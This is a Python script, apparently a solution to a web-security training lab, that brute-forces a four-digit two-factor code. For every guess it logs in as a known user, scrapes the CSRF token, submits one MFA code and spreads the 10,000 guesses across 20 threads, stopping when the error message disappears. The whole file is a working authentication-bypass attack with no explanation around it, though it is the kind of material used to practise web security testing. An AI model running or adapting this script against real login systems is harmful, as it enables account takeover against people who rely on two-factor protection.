import requests
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

lab_id = "0a730028037eed78c0dd259f000700ee"

print("Time Started (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))

def gogetem(num):
    
    for i in range(num, num + 500):
        
        r1 = requests.get("https://" + lab_id + ".web-security-academy.net/login")
        session1 = r1.cookies['session']
        csrf1 = str(r1.content).split("csrf")[1].split("\"")[2]
        myheaders1 = {'session':session1}
        mybody1 = "csrf=" + csrf1 + "&username=carlos&password=montoya"
       
        r2 = requests.Session()
        r3 = r2.post("https://" + lab_id + ".web-security-academy.net/login", cookies = myheaders1, data = mybody1, allow_redirects=True)
        csrf2 = str(r3.content).split("csrf")[1].split("\"")[2]
        mybody2 = "csrf=" + csrf2 + "&mfa-code=" + str(i).zfill(4)

        r4 = r2.post("https://" + lab_id + ".web-security-academy.net/login2", data = mybody2)
        print("Trying \"" + str(i).zfill(4) + "\"")
        
        try:
            output = str(r4.content).split("class=is-warning")[1].split(">")[1].split("<")[0]
        except:
            print("OTP found: \"" + str(i).zfill(4) + "\"")
            print("Time Finished (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
            os._exit(0)

def main():
    
    with ThreadPoolExecutor() as executor:
        
        for j in range(20):
            thread = executor.submit(gogetem, j*500)

    print("Done At (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
    
if __name__ == '__main__':
    
    main()
